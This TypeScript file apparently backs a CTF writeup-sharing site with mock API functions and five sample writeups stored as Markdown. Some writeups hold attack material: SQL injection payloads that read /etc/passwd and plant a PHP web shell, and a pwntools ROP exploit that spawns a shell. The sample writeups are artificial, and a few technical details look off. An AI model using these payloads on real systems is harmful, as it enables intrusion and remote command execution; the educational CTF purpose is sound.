import { ApiResponse } from '@/types/api';

export interface WriteupRating {
  id: string;
  userId: string;
  writeupId: string;
  rating: number; // 1-5 stars
  createdAt: string;
}

export interface WriteupComment {
  id: string;
  userId: string;
  username: string;
  writeupId: string;
  content: string;
  createdAt: string;
  avatarUrl?: string;
  parentId?: string; // For nested comments
  level: number; // Nesting level
  likes: number;
}

export interface Writeup {
  id: string;
  title: string;
  description: string;
  content: string; // Markdown content
  authorId: string;
  authorName: string;
  authorAvatar?: string;
  contestId?: string;
  contestName?: string;
  challengeName?: string;
  category: 'web' | 'crypto' | 'reverse' | 'pwn' | 'forensics' | 'misc' | 'hardware';
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  tags: string[];
  views: number;
  likes: number;
  averageRating: number;
  totalRatings: number;
  createdAt: string;
  updatedAt: string;
  readTime: number; // in minutes
  featured: boolean;
  verified: boolean; // If the writeup is verified by moderators
}

export interface WriteupFilters {
  search?: string;
  category?: string;
  difficulty?: string;
  author?: string;
  contest?: string;
  tags?: string[];
  featured?: boolean;
  verified?: boolean;
  sortBy?: 'newest' | 'oldest' | 'rating' | 'views' | 'likes';
}

export interface WriteupListResponse {
  writeups: Writeup[];
  total: number;
  page: number;
  limit: number;
  totalPages: number;
}

// Mock data
const mockWriteups: Writeup[] = [
  {
    id: "wu-001",
    title: "Breaking RSA with Small Exponent - picoCTF 2024",
    description: "A comprehensive guide to exploiting RSA implementations with small public exponents. We'll explore Wiener's attack and other mathematical approaches to crack weak RSA keys.",
    content: `# Breaking RSA with Small Exponent Attack

## Challenge Overview

In this challenge, we're given an RSA implementation with a suspiciously small public exponent. This is a classic vulnerability that can be exploited using several mathematical techniques.

## Initial Analysis

First, let's examine what we're given:

\`\`\`python
n = 0x9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
e = 3
c = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
\`\`\`

The small exponent \`e = 3\` immediately raises red flags. This is vulnerable to several attacks:

### 1. Low Exponent Attack

When the message is small and the exponent is low, the ciphertext might be smaller than the modulus:

\`\`\`python
import gmpy2

# If m^e < n, then c = m^e (no modular reduction)
m = gmpy2.iroot(c, e)[0]
if pow(m, e) == c:
    print(f"Flag: {m.to_bytes((m.bit_length() + 7) // 8, 'big')}")
\`\`\`

### 2. Wiener's Attack

If the private exponent is small, we can use continued fractions:

\`\`\`python
def wiener_attack(n, e):
    convergents = continued_fraction(e, n)
    for k, d in convergents:
        if k != 0 and (e * d - 1) % k == 0:
            phi = (e * d - 1) // k
            discriminant = (n - phi + 1) ** 2 - 4 * n
            if discriminant >= 0:
                sqrt_discriminant = int(discriminant ** 0.5)
                if sqrt_discriminant * sqrt_discriminant == discriminant:
                    return d
    return None
\`\`\`

## Final Solution

After trying the low exponent attack, we find that the message was indeed small enough:

\`\`\`python
#!/usr/bin/env python3
import gmpy2

n = 0x9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
e = 3
c = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef

# Low exponent attack
m = gmpy2.iroot(c, e)[0]
flag = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()
print(f"Flag: {flag}")
\`\`\`

## Key Takeaways

1. Always check for small exponents in RSA implementations
2. Consider the message size relative to the modulus
3. Wiener's attack is effective when d < n^0.25
4. Use proper padding schemes like OAEP to prevent these attacks

This challenge teaches us the importance of proper cryptographic implementation and the dangers of using small exponents without adequate padding.`,
    authorId: "user-001",
    authorName: "CryptoNinja",
    authorAvatar: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=64&h=64&fit=crop&crop=face",
    contestId: "contest-001",
    contestName: "picoCTF 2024",
    challengeName: "Small RSA",
    category: "crypto",
    difficulty: "Medium",
    tags: ["RSA", "low-exponent", "wiener-attack", "number-theory"],
    views: 15420,
    likes: 284,
    averageRating: 4.8,
    totalRatings: 156,
    createdAt: "2024-01-15T10:30:00Z",
    updatedAt: "2024-01-15T14:22:00Z",
    readTime: 8,
    featured: true,
    verified: true
  },
  {
    id: "wu-002",
    title: "SQL Injection to RCE - Advanced Web Exploitation",
    description: "From basic SQL injection to remote code execution. A step-by-step guide showing how to escalate a simple SQLi to full system compromise.",
    content: `# SQL Injection to Remote Code Execution

## Challenge Overview

This writeup demonstrates how a simple SQL injection vulnerability can be escalated to achieve remote code execution on the target system.

## Reconnaissance

Initial scanning revealed a login form vulnerable to SQL injection:

\`\`\`bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs
\`\`\`

## Exploitation Steps

### Step 1: Basic SQL Injection

First, we confirmed the injection point:

\`\`\`sql
username: admin' OR '1'='1' --
password: anything
\`\`\`

### Step 2: Database Enumeration

Using UNION-based injection to extract database information:

\`\`\`sql
admin' UNION SELECT 1,2,3,user(),database(),version() --
\`\`\`

### Step 3: File System Access

The MySQL user had FILE privileges, allowing us to read files:

\`\`\`sql
admin' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --
\`\`\`

### Step 4: Writing Web Shell

Using INTO OUTFILE to write a PHP web shell:

\`\`\`sql
admin' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' --
\`\`\`

### Step 5: Remote Code Execution

Accessing our uploaded shell:

\`\`\`bash
curl "http://target.com/shell.php?cmd=id"
curl "http://target.com/shell.php?cmd=cat /flag.txt"
\`\`\`

## Mitigation

1. Use parameterized queries
2. Implement proper input validation
3. Apply principle of least privilege
4. Disable dangerous MySQL functions
5. Use Web Application Firewalls

This exploit chain shows how a single vulnerability can lead to complete system compromise.`,
    authorId: "user-002",
    authorName: "WebHacker",
    authorAvatar: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=64&h=64&fit=crop&crop=face",
    contestId: "contest-002",
    contestName: "HackTheBox Cyber Apocalypse",
    challengeName: "Toxic",
    category: "web",
    difficulty: "Hard",
    tags: ["sqli", "rce", "file-upload", "mysql", "web-shell"],
    views: 8934,
    likes: 198,
    averageRating: 4.6,
    totalRatings: 89,
    createdAt: "2024-01-10T09:15:00Z",
    updatedAt: "2024-01-11T16:45:00Z",
    readTime: 12,
    featured: true,
    verified: true
  },
  {
    id: "wu-003",
    title: "Buffer Overflow with DEP/ASLR Bypass",
    description: "Modern binary exploitation techniques for bypassing Data Execution Prevention and Address Space Layout Randomization on Linux x64.",
    content: `# Buffer Overflow with DEP/ASLR Bypass

## Introduction

This writeup covers advanced binary exploitation techniques for bypassing modern security mitigations like DEP (Data Execution Prevention) and ASLR (Address Space Layout Randomization).

## Binary Analysis

\`\`\`bash
file challenge
checksec challenge
\`\`\`

Output shows:
- NX enabled (DEP)
- PIE disabled
- Canary disabled
- ASLR enabled

## Vulnerability Discovery

Using \`gdb\` and \`pwndbg\` to analyze the binary:

\`\`\`python
from pwn import *

# Find the overflow offset
p = process('./challenge')
p.sendline(cyclic(200))
# Crash analysis shows offset of 72
\`\`\`

## Exploitation Strategy

Since DEP is enabled, we need to use ROP (Return-Oriented Programming):

\`\`\`python
#!/usr/bin/env python3
from pwn import *

# Binary setup
elf = ELF('./challenge')
libc = ELF('./libc.so.6')
p = process('./challenge')

# Leak libc address
payload1 = b'A' * 72
payload1 += p64(elf.plt['puts'])  # Call puts
payload1 += p64(elf.symbols['main'])  # Return to main
payload1 += p64(elf.got['puts'])  # puts GOT entry

p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc.address = leak - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

# Second stage - get shell
payload2 = b'A' * 72
payload2 += p64(libc.address + 0x23b6a)  # one_gadget
p.sendline(payload2)

p.interactive()
\`\`\`

## Advanced Techniques

### ROP Chain Construction

\`\`\`python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
\`\`\`

### One-Gadget Usage

Finding one-gadgets in libc:

\`\`\`bash
one_gadget libc.so.6
\`\`\`

This challenge demonstrates how modern exploit mitigations can be bypassed using return-oriented programming and information leaks.`,
    authorId: "user-003",
    authorName: "BinaryNinja",
    authorAvatar: "https://images.unsplash.com/photo-1560250097-0b93528c311a?w=64&h=64&fit=crop&crop=face",
    contestId: "contest-003",
    contestName: "DEF CON CTF",
    challengeName: "Speedrun",
    category: "pwn",
    difficulty: "Hard",
    tags: ["buffer-overflow", "rop", "aslr-bypass", "dep-bypass", "one-gadget"],
    views: 12567,
    likes: 345,
    averageRating: 4.9,
    totalRatings: 203,
    createdAt: "2024-01-05T14:20:00Z",
    updatedAt: "2024-01-06T11:30:00Z",
    readTime: 15,
    featured: true,
    verified: true
  },
  {
    id: "wu-004",
    title: "Android Malware Reverse Engineering",
    description: "Complete analysis of a sophisticated Android banking trojan including static and dynamic analysis techniques.",
    content: `# Android Malware Reverse Engineering

## Sample Overview

This writeup analyzes a sophisticated Android banking trojan discovered in the wild. We'll use both static and dynamic analysis to understand its behavior.

## Static Analysis

### APK Extraction and Examination

\`\`\`bash
unzip malware.apk
aapt dump badging malware.apk
jadx-gui malware.apk
\`\`\`

### Manifest Analysis

Key findings in AndroidManifest.xml:
- Requests SYSTEM_ALERT_WINDOW permission
- Declares accessibility service
- Hidden launcher icon

### Code Analysis

Using JADX to decompile the DEX files:

\`\`\`java
public class BankingOverlay extends Service {
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName().toString();
        if (isTargetBankingApp(packageName)) {
            showPhishingOverlay();
        }
    }
}
\`\`\`

## Dynamic Analysis

### Emulator Setup

\`\`\`bash
# Create Android emulator
avd create -n malware_analysis -k "system-images;android-28;google_apis;x86"
emulator -avd malware_analysis -writable-system
\`\`\`

### Network Traffic Analysis

Using Burp Suite and Wireshark to capture network traffic:

\`\`\`bash
# Set up proxy
adb shell settings put global http_proxy 192.168.1.100:8080
\`\`\`

## Behavioral Analysis

The malware exhibits several malicious behaviors:

1. **Overlay Attacks**: Creates fake login screens
2. **SMS Theft**: Intercepts 2FA codes
3. **Contact Harvesting**: Steals contact information
4. **Remote Control**: Accepts commands from C&C server

## C&C Communication

The malware communicates with its command and control server using encrypted HTTP requests:

\`\`\`python
# Decrypt C&C traffic
def decrypt_message(encrypted_data, key):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(encrypted_data)
\`\`\`

## Indicators of Compromise

- Package name: com.android.systemupdate
- C&C domains: evil-domain[.]com
- File paths: /data/data/com.android.systemupdate/

This analysis provides insights into modern Android malware techniques and helps develop better detection mechanisms.`,
    authorId: "user-004",
    authorName: "MalwareHunter",
    authorAvatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=64&h=64&fit=crop&crop=face",
    contestId: "contest-004",
    contestName: "FlareOn Challenge",
    challengeName: "Android Maze",
    category: "reverse",
    difficulty: "Insane",
    tags: ["android", "malware", "reverse-engineering", "jadx", "static-analysis"],
    views: 6789,
    likes: 156,
    averageRating: 4.7,
    totalRatings: 67,
    createdAt: "2024-01-02T16:45:00Z",
    updatedAt: "2024-01-03T09:20:00Z",
    readTime: 20,
    featured: false,
    verified: true
  },
  {
    id: "wu-005",
    title: "Steganography in PNG Images - Hidden Messages",
    description: "Advanced steganographic techniques for hiding and extracting data from PNG image files using LSB and frequency domain methods.",
    content: `# Steganography in PNG Images

## Challenge Overview

This forensics challenge involved extracting hidden messages from what appeared to be innocent PNG images using various steganographic techniques.

## Initial Analysis

\`\`\`bash
file image.png
exiftool image.png
binwalk image.png
strings image.png | grep -i flag
\`\`\`

## LSB Steganography

### Extracting Hidden Data

Using Python to extract LSB data:

\`\`\`python
from PIL import Image
import numpy as np

def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = np.array(img)
    
    # Extract LSBs from red channel
    lsb_data = []
    for row in pixels:
        for pixel in row:
            lsb_data.append(pixel[0] & 1)
    
    # Convert bits to bytes
    message = ""
    for i in range(0, len(lsb_data), 8):
        byte = 0
        for j in range(8):
            if i + j < len(lsb_data):
                byte |= lsb_data[i + j] << (7 - j)
        if byte == 0:
            break
        message += chr(byte)
    
    return message

hidden_message = extract_lsb("image.png")
print(f"Hidden message: {hidden_message}")
\`\`\`

## Frequency Domain Analysis

Sometimes data is hidden in the frequency domain:

\`\`\`python
import cv2
import numpy as np

def dct_extract(image_path):
    img = cv2.imread(image_path, 0)
    dct = cv2.dct(np.float32(img))
    
    # Extract data from DCT coefficients
    message = ""
    for i in range(0, min(64, dct.shape[0])):
        for j in range(0, min(64, dct.shape[1])):
            if dct[i][j] % 2 == 1:
                message += "1"
            else:
                message += "0"
    
    return message

freq_data = dct_extract("image.png")
\`\`\`

## Stegsolve Analysis

Using Stegsolve for visual analysis:

1. Load image in Stegsolve
2. Navigate through different bit planes
3. Look for patterns in LSB planes
4. Check for hidden text or images

## Advanced Techniques

### Outguess Detection

\`\`\`bash
outguess -r image.png output.txt
\`\`\`

### F5 Algorithm

\`\`\`python
# F5 uses matrix encoding for better capacity
# Detection requires statistical analysis
def detect_f5(image_path):
    # Chi-square attack implementation
    pass
\`\`\`

## Final Solution

The flag was hidden using a combination of techniques:

\`\`\`python
#!/usr/bin/env python3
import struct
from PIL import Image

def extract_flag(image_path):
    img = Image.open(image_path)
    width, height = img.size
    
    # Extract from alpha channel LSBs
    flag_bits = []
    for y in range(height):
        for x in range(width):
            r, g, b, a = img.getpixel((x, y))
            flag_bits.append(a & 1)
    
    # Convert to string
    flag = ""
    for i in range(0, len(flag_bits), 8):
        byte = 0
        for j in range(8):
            if i + j < len(flag_bits):
                byte |= flag_bits[i + j] << j
        if 32 <= byte <= 126:
            flag += chr(byte)
        elif byte == 0:
            break
    
    return flag

print(extract_flag("challenge.png"))
\`\`\`

This challenge demonstrated the importance of checking all channels and using multiple steganographic detection tools.`,
    authorId: "user-005",
    authorName: "ForensicsExpert",
    authorAvatar: "https://images.unsplash.com/photo-1494790108755-2616b612b786?w=64&h=64&fit=crop&crop=face",
    contestId: "contest-005",
    contestName: "CSAW CTF",
    challengeName: "Hidden in Plain Sight",
    category: "forensics",
    difficulty: "Easy",
    tags: ["steganography", "lsb", "png", "stegsolve", "frequency-domain"],
    views: 4567,
    likes: 89,
    averageRating: 4.3,
    totalRatings: 34,
    createdAt: "2023-12-28T11:30:00Z",
    updatedAt: "2023-12-29T15:45:00Z",
    readTime: 10,
    featured: false,
    verified: true
  }
];

const mockComments: WriteupComment[] = [
  {
    id: "comment-001",
    userId: "user-006",
    username: "MathGeek",
    writeupId: "wu-001",
    content: "Excellent explanation of the low exponent attack! The mathematical background really helps understand why this works.",
    createdAt: "2024-01-15T12:30:00Z",
    avatarUrl: "https://images.unsplash.com/photo-1527980965255-d3b416303d12?w=64&h=64&fit=crop&crop=face",
    level: 0,
    likes: 23
  },
  {
    id: "comment-002",
    userId: "user-007",
    username: "CryptoStudent",
    writeupId: "wu-001",
    content: "Thanks for this writeup! Could you explain more about when Wiener's attack is applicable?",
    createdAt: "2024-01-15T14:15:00Z",
    avatarUrl: "https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=64&h=64&fit=crop&crop=face",
    parentId: "comment-001",
    level: 1,
    likes: 8
  },
  {
    id: "comment-003",
    userId: "user-008",
    username: "SQLNinja",
    writeupId: "wu-002",
    content: "Great escalation path! I've seen similar techniques used in real-world penetration tests.",
    createdAt: "2024-01-10T16:20:00Z",
    avatarUrl: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=64&h=64&fit=crop&crop=face",
    level: 0,
    likes: 15
  }
];

const mockRatings: WriteupRating[] = [
  {
    id: "rating-001",
    userId: "user-006",
    writeupId: "wu-001",
    rating: 5,
    createdAt: "2024-01-15T12:30:00Z"
  },
  {
    id: "rating-002",
    userId: "user-007",
    writeupId: "wu-001",
    rating: 4,
    createdAt: "2024-01-15T14:15:00Z"
  }
];

// API Functions
export async function getWriteups(
  filters: WriteupFilters = {},
  page = 1,
  limit = 12
): Promise<ApiResponse<WriteupListResponse>> {
  // Simulate API delay
  await new Promise(resolve => setTimeout(resolve, 300));

  let filteredWriteups = [...mockWriteups];

  // Apply filters
  if (filters.search) {
    const search = filters.search.toLowerCase();
    filteredWriteups = filteredWriteups.filter(writeup =>
      writeup.title.toLowerCase().includes(search) ||
      writeup.description.toLowerCase().includes(search) ||
      writeup.tags.some(tag => tag.toLowerCase().includes(search))
    );
  }

  if (filters.category) {
    filteredWriteups = filteredWriteups.filter(writeup => writeup.category === filters.category);
  }

  if (filters.difficulty) {
    filteredWriteups = filteredWriteups.filter(writeup => writeup.difficulty === filters.difficulty);
  }

  if (filters.author) {
    filteredWriteups = filteredWriteups.filter(writeup => 
      writeup.authorName.toLowerCase().includes(filters.author!.toLowerCase())
    );
  }

  if (filters.featured !== undefined) {
    filteredWriteups = filteredWriteups.filter(writeup => writeup.featured === filters.featured);
  }

  if (filters.verified !== undefined) {
    filteredWriteups = filteredWriteups.filter(writeup => writeup.verified === filters.verified);
  }

  if (filters.tags && filters.tags.length > 0) {
    filteredWriteups = filteredWriteups.filter(writeup =>
      filters.tags!.some(tag => writeup.tags.includes(tag))
    );
  }

  // Apply sorting
  switch (filters.sortBy) {
    case 'oldest':
      filteredWriteups.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
      break;
    case 'rating':
      filteredWriteups.sort((a, b) => b.averageRating - a.averageRating);
      break;
    case 'views':
      filteredWriteups.sort((a, b) => b.views - a.views);
      break;
    case 'likes':
      filteredWriteups.sort((a, b) => b.likes - a.likes);
      break;
    case 'newest':
    default:
      filteredWriteups.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      break;
  }

  // Pagination
  const total = filteredWriteups.length;
  const totalPages = Math.ceil(total / limit);
  const startIndex = (page - 1) * limit;
  const endIndex = startIndex + limit;
  const paginatedWriteups = filteredWriteups.slice(startIndex, endIndex);

  return {
    success: true,
    data: {
      writeups: paginatedWriteups,
      total,
      page,
      limit,
      totalPages
    }
  };
}

export async function getWriteup(id: string): Promise<ApiResponse<Writeup>> {
  await new Promise(resolve => setTimeout(resolve, 200));

  const writeup = mockWriteups.find(w => w.id === id);

  if (!writeup) {
    return {
      success: false,
      error: 'Writeup not found'
    };
  }

  // Increment view count
  writeup.views += 1;

  return {
    success: true,
    data: writeup
  };
}

export async function getWriteupComments(writeupId: string): Promise<ApiResponse<WriteupComment[]>> {
  await new Promise(resolve => setTimeout(resolve, 150));

  const comments = mockComments.filter(comment => comment.writeupId === writeupId);

  return {
    success: true,
    data: comments
  };
}

export async function addWriteupComment(
  writeupId: string,
  content: string,
  parentId?: string
): Promise<ApiResponse<WriteupComment>> {
  await new Promise(resolve => setTimeout(resolve, 200));

  const newComment: WriteupComment = {
    id: `comment-${Date.now()}`,
    userId: 'current-user',
    username: 'CurrentUser',
    writeupId,
    content,
    createdAt: new Date().toISOString(),
    ...(parentId && { parentId }),
    level: parentId ? 1 : 0,
    likes: 0
  };

  mockComments.push(newComment);

  return {
    success: true,
    data: newComment
  };
}

export async function rateWriteup(writeupId: string, rating: number): Promise<ApiResponse<void>> {
  await new Promise(resolve => setTimeout(resolve, 200));

  const writeup = mockWriteups.find(w => w.id === writeupId);
  if (!writeup) {
    return {
      success: false,
      error: 'Writeup not found'
    };
  }

  // Add new rating
  const newRating: WriteupRating = {
    id: `rating-${Date.now()}`,
    userId: 'current-user',
    writeupId,
    rating,
    createdAt: new Date().toISOString()
  };

  mockRatings.push(newRating);

  // Recalculate average rating
  const writeupRatings = mockRatings.filter(r => r.writeupId === writeupId);
  writeup.totalRatings = writeupRatings.length;
  writeup.averageRating = writeupRatings.reduce((sum, r) => sum + r.rating, 0) / writeupRatings.length;

  return {
    success: true,
    data: undefined
  };
}

export async function createWriteup(writeupData: Partial<Writeup>, userId?: string): Promise<ApiResponse<Writeup>> {
  await new Promise(resolve => setTimeout(resolve, 500));

  if (!userId) {
    return {
      success: false,
      error: 'Authentication required'
    };
  }

  const newWriteup: Writeup = {
    id: `wu-${Date.now()}`,
    title: writeupData.title || '',
    description: writeupData.description || '',
    content: writeupData.content || '',
    authorId: userId,
    authorName: 'CurrentUser', // In real app, this would come from user data
    category: writeupData.category || 'misc',
    difficulty: writeupData.difficulty || 'Easy',
    tags: writeupData.tags || [],
    views: 0,
    likes: 0,
    averageRating: 0,
    totalRatings: 0,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    readTime: Math.ceil((writeupData.content || '').length / 200), // Rough estimate
    featured: false,
    verified: false,
    contestId: writeupData.contestId,
    contestName: writeupData.contestName,
    challengeName: writeupData.challengeName
  };

  mockWriteups.unshift(newWriteup);

  return {
    success: true,
    data: newWriteup
  };
}

export async function updateWriteup(
  id: string,
  writeupData: Partial<Writeup>,
  userId?: string
): Promise<ApiResponse<Writeup>> {
  await new Promise(resolve => setTimeout(resolve, 500));

  if (!userId) {
    return {
      success: false,
      error: 'Authentication required'
    };
  }

  const writeupIndex = mockWriteups.findIndex(w => w.id === id);
  if (writeupIndex === -1) {
    return {
      success: false,
      error: 'Writeup not found'
    };
  }

  const writeup = mockWriteups[writeupIndex];
  if (writeup.authorId !== userId) {
    return {
      success: false,
      error: 'Permission denied'
    };
  }

  const updatedWriteup: Writeup = {
    ...writeup,
    ...writeupData,
    id: writeup.id, // Ensure ID cannot be changed
    authorId: writeup.authorId, // Ensure author cannot be changed
    createdAt: writeup.createdAt, // Ensure creation date cannot be changed
    updatedAt: new Date().toISOString(),
    readTime: Math.ceil((writeupData.content || writeup.content).length / 200),
  };

  mockWriteups[writeupIndex] = updatedWriteup;

  return {
    success: true,
    data: updatedWriteup
  };
}

export async function deleteWriteup(id: string, userId?: string): Promise<ApiResponse<void>> {
  await new Promise(resolve => setTimeout(resolve, 300));

  if (!userId) {
    return {
      success: false,
      error: 'Authentication required'
    };
  }

  const writeupIndex = mockWriteups.findIndex(w => w.id === id);
  if (writeupIndex === -1) {
    return {
      success: false,
      error: 'Writeup not found'
    };
  }

  const writeup = mockWriteups[writeupIndex];
  if (writeup.authorId !== userId) {
    return {
      success: false,
      error: 'Permission denied'
    };
  }

  mockWriteups.splice(writeupIndex, 1);

  // Also remove associated comments and ratings
  const commentIndicesToRemove = mockComments
    .map((comment, index) => comment.writeupId === id ? index : -1)
    .filter(index => index !== -1)
    .reverse(); // Remove from end to avoid index shifting

  commentIndicesToRemove.forEach(index => {
    mockComments.splice(index, 1);
  });

  const ratingIndicesToRemove = mockRatings
    .map((rating, index) => rating.writeupId === id ? index : -1)
    .filter(index => index !== -1)
    .reverse();

  ratingIndicesToRemove.forEach(index => {
    mockRatings.splice(index, 1);
  });

  return {
    success: true,
    data: undefined
  };
}

export async function getUserWriteups(userId: string, page = 1, limit = 12): Promise<ApiResponse<WriteupListResponse>> {
  await new Promise(resolve => setTimeout(resolve, 200));

  const userWriteups = mockWriteups.filter(writeup => writeup.authorId === userId);

  // Sort by creation date (newest first)
  userWriteups.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());

  // Pagination
  const total = userWriteups.length;
  const totalPages = Math.ceil(total / limit);
  const startIndex = (page - 1) * limit;
  const endIndex = startIndex + limit;
  const paginatedWriteups = userWriteups.slice(startIndex, endIndex);

  return {
    success: true,
    data: {
      writeups: paginatedWriteups,
      total,
      page,
      limit,
      totalPages
    }
  };
}
